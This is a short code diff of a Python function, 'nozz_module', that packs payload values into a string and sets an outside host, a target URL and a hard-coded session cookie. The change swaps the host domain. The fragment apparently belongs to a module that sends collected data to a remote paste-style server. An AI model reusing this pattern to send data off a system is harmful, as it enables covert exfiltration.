@@ -11,7 +11,7 @@ def nozz_module(payload, self=False):
 	payloads=':'.join(str(v) for v in payload.values())
 
 	## Configs
-	host="pastd.com"
+	host="pstd.com"
 	target="http://"+host+"/9f20df16"
 	cookie="PHPSESSID=ahd8fj39jkrf0934k40dk"
 	headers = {
